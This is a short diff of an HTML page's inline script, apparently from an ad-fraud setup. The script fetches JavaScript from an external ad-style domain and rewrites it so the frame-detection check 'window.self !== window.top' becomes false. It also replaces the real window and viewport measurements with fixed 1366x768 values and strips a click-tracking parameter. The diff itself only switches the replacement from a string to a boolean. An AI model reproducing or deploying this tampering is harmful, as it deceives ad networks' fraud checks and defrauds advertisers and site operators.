@@ -11,7 +11,7 @@
   <script>
 $.get("https://whautsis.com/4/8150310?var=z1", function(data, status){
       var data1 = data.replace(/&clksf=1/g, "");
-      var data2 = data1.replace("window.self !== window.top", "false");
+      var data2 = data1.replace("window.self !== window.top", false);
       var data3 = data2.replace("l.document.documentElement.clientWidth", "1366");
      var data4 = data3.replace("l.innerWidth || -1", "1366");
       var data5 = data4.replace("l.innerHeight || -1", "768");
